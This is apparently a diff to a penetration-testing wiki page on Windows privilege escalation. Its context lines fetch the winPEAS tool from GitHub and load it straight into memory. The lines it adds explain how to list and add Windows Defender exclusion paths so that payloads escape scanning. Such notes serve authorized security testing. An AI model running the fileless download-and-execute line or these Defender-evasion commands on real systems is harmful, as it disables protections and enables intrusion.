@@ -85,3 +85,32 @@ $url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); 
 [winPEAS.Program]::Main("")
 ```
+
+## Defender: Exclusions
+
+When dealing with Windows Defender, an Administrator account can manage the settings of Defender. Simply trying to disable it via the command line will seem suspicious and likely get you blocked. Instead, you can take a look at the **exclusions** that Defender won't check.
+
+{% hint style="info" %}
+Managing Exclusions requires an elevated shell. Check [#uac-bypass](local-privilege-escalation.md#uac-bypass "mention") for more info.
+{% endhint %}
+
+{% code title="List Exclusions" %}
+```powershell
+Get-MpPreference | Select-Object -Property ExclusionPath -ExpandProperty ExclusionPath
+```
+{% endcode %}
+
+If you can write your payload in any of the above directories, you will fully bypass Defender. If there is no such directory, you can add one to the list with the following command. You just have to successfully execute it once to fully bypass Windows Defender in the future.
+
+{% code title="Add Exclusion" %}
+```powershell
+Add-MpPreference -ExclusionPath 'C:\Windows\Tasks'
+```
+{% endcode %}
+
+{% code title="Remove Exclusion" %}
+```powershell
+Remove-MpPreference -ExclusionPath C:\Windows\Tasks
+```
+{% endcode %}
+
